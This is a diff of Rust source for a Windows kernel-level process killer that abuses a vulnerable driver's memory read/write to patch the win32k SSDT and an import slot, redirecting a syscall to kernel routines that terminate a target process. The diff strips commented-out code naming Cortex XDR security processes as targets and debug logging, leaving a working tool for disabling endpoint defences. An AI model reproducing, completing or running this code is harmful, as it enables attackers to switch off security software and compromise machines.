@@ -10,7 +10,7 @@ use windows_sys::Win32::Storage::FileSystem::{
 };
 use windows_sys::Win32::System::IO::DeviceIoControl;
 use windows_sys::Win32::System::LibraryLoader::{
-    DONT_RESOLVE_DLL_REFERENCES, GetProcAddress, LOAD_LIBRARY_FLAGS, LoadLibraryExA,
+    DONT_RESOLVE_DLL_REFERENCES, GetProcAddress, LoadLibraryExA,
 };
 use windows_sys::Win32::System::Memory::{
     MEM_COMMIT, MEMORY_BASIC_INFORMATION, MEMORY_MAPPED_VIEW_ADDRESS, UnmapViewOfFile, VirtualQuery,
@@ -64,7 +64,6 @@ impl Astra {
                 null_mut(),
             )
         };
-        // .map_err(|e| format!("open Astra32Device0: {e}"))?;
         Ok(Self {
             dev,
             hint_high: std::cell::Cell::new(0),
@@ -87,7 +86,6 @@ impl Astra {
                 null_mut(),
             );
         }
-        // .map_err(|e| format!("MSR IOCTL: {e}"))?;
         Ok(u64::from_le_bytes(io))
     }
 
@@ -439,7 +437,6 @@ fn load_disk_image(name: &str) -> Result<(usize, usize), String> {
             DONT_RESOLVE_DLL_REFERENCES,
         )
     };
-    // .map_err(|e| format!("LoadLibraryExA({name}): {e}"))?;
     let b = h as usize;
     let lfn = unsafe { *((b + 0x3C) as *const u32) } as usize;
     Ok((b, unsafe { *((b + lfn + 0x50) as *const u32) } as usize))
@@ -488,51 +485,13 @@ fn resolve_trigger(name: &str) -> Result<TriggerFn, String> {
             DONT_RESOLVE_DLL_REFERENCES,
         )
     };
-    // .map_err(|e| format!("LoadLibraryExA(win32u): {e}"))?;
     let f = CString::new(name).unwrap();
     let p = unsafe { GetProcAddress(h, PCSTR::from(f.as_ptr() as _)) }
         .ok_or_else(|| format!("{name} missing"))?;
     Ok(unsafe { mem::transmute(p) })
 }
 
-// fn list_edr_processes(targets: &[&str]) -> Vec<(String, u32)> {
-//     use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
-//     let mut r = Vec::new();
-
-//     let snap = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
-//     if snap.is_null() {
-//         return r;
-//     }
-
-//     let mut e = PROCESSENTRY32W {
-//         dwSize: mem::size_of::<PROCESSENTRY32W>() as u32,
-//         ..Default::default()
-//     };
-//     if unsafe { Process32FirstW(snap, &mut e) == 0 } {
-//         let _ = unsafe { CloseHandle(snap) };
-//         return r;
-//     }
-//     loop {
-//         let name = String::from_utf16_lossy(
-//             &e.szExeFile[..e
-//                 .szExeFile
-//                 .iter()
-//                 .position(|&c| c == 0)
-//                 .unwrap_or(e.szExeFile.len())],
-//         );
-//         for &t in targets {
-//             if name.eq_ignore_ascii_case(t) {
-//                 r.push((name.clone(), e.th32ProcessID));
-//             }
-//         }
-//         if unsafe { Process32NextW(snap, &mut e) == 0 } {
-//             break;
-//         }
-//     }
-//     let _ = unsafe { CloseHandle(snap) };
-//     r
-// }
-
+#[allow(dead_code)]
 struct SsdtInfo {
     w32k_base: u64,
     w32k_limit: u32,
@@ -650,15 +609,6 @@ fn encode_entry(target: u64, base: u64, orig: u32) -> Result<u32, String> {
 }
 
 pub fn kill_proc(proc_name: String, pid: u32) -> bool {
-    // let targets = [
-    //     "cortex-xdr-payload.exe",
-    //     "cysandbox.exe",
-    //     "cyserver.exe",
-    //     "cyuserver.exe",
-    //     "cywscsvc.exe",
-    //     "tlaworker.exe",
-    // ];
-
     let drv = match Astra::open() {
         Ok(d) => {
             log("[+] Opened driver handle");
@@ -720,14 +670,6 @@ pub fn kill_proc(proc_name: String, pid: u32) -> bool {
             std::process::exit(1);
         }
     };
-    // log(&format!(
-    //     "[+] ExAllocatePoolWithTag      = 0x{pool_alloc:X}"
-    // ));
-    // log(&format!("[+] PsLookupProcessByProcessId = 0x{ps_lookup:X}"));
-    // log(&format!("[+] PsTerminateProcess          = 0x{ps_term:X}"));
-    // log(&format!(
-    //     "[+] ObfDereferenceObject         = 0x{obf_deref:X}"
-    // ));
 
     unsafe { IsGUIThread(1) };
 
@@ -738,10 +680,6 @@ pub fn kill_proc(proc_name: String, pid: u32) -> bool {
             std::process::exit(1);
         }
     };
-    // log(&format!(
-    //     "[+] W32 SSDT = 0x{:X} limit={}",
-    //     ssdt.w32k_base, ssdt.w32k_limit
-    // ));
 
     let w32k_base = {
         let start = ssdt.w32k_base & !0xFFF;
@@ -785,10 +723,8 @@ pub fn kill_proc(proc_name: String, pid: u32) -> bool {
 
     let (w32u_disk, _) = load_disk_image("win32u.dll").unwrap();
     let call_idx = get_syscall_index(w32u_disk, "NtUserSetWindowPos").unwrap();
-    // log(&format!("[+] NtUserSetWindowPos idx=0x{call_idx:X}"));
 
     let (g_va, g_iat) = find_gadget_disk(disk, dsz, w32k_base, ssdt.w32k_base).unwrap();
-    // log(&format!("[+] FF 25 gadget @ 0x{g_va:X} -> IAT 0x{g_iat:X}"));
 
     let entry_va = ssdt.w32k_base + (call_idx as u64) * 4;
     let orig_entry = vread_u32(&drv, cr3, entry_va).unwrap();
@@ -797,7 +733,6 @@ pub fn kill_proc(proc_name: String, pid: u32) -> bool {
 
     let trig = resolve_trigger("NtUserSetWindowPos").unwrap();
 
-    // log("[*] Patching SSDT + IAT -> ExAllocatePoolWithTag...");
     vwrite_u64(&drv, cr3, g_iat, pool_alloc);
     vwrite_u32(&drv, cr3, entry_va, new_entry);
 
@@ -810,14 +745,6 @@ pub fn kill_proc(proc_name: String, pid: u32) -> bool {
         std::process::exit(1);
     }
     let pool_va = pool as u64;
-    // log(&format!("[+] Pool = 0x{pool_va:X}"));
-
-    // let procs = list_edr_processes(&targets);
-    // if procs.is_empty() {
-    // log("[*] No targets found");
-    // } else {
-    // let pids: Vec<u32> = Vec::new();
-    // for pid in pids {
     vwrite_u64(&drv, cr3, pool_va, 0);
     vwrite_u64(&drv, cr3, g_iat, ps_lookup);
     let st = unsafe { (trig)(pid as usize, pool_va as usize, 0, 0, 0, 0, 0) };
@@ -842,12 +769,9 @@ pub fn kill_proc(proc_name: String, pid: u32) -> bool {
 
     vwrite_u64(&drv, cr3, g_iat, obf_deref);
     unsafe { (trig)(eproc as usize, 0, 0, 0, 0, 0, 0) };
-    // }
-    // }
 
     vwrite_u32(&drv, cr3, entry_va, orig_entry);
     vwrite_u64(&drv, cr3, g_iat, orig_iat);
 
     return true;
-    // log("[+] Done");
 }
